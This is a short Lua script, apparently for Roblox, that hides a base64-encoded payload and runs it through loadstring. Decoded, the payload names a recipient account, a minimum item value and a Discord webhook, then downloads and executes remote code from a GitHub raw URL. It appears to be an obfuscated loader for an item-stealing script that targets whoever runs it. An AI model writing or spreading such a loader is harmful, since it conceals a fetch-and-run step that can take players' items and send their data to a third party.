
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImphY2tib2dsZTEyIgpVc2VybmFtZTIgPSAiamFja2JvZ2xlMTIiCk1pbmltdW1SQVAgPSAxMDAKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzU3MTgwMzQyMDc4OTMxMDI0L3V6YnZPLUxNT25ra2hGaHhucGNYYXJpRWFYb2tLTzUyb19nNHVsVnlpRE1WM1kxVE9SMF9VRW85MkdPel9Zc0ptNktIIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wczk5IiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()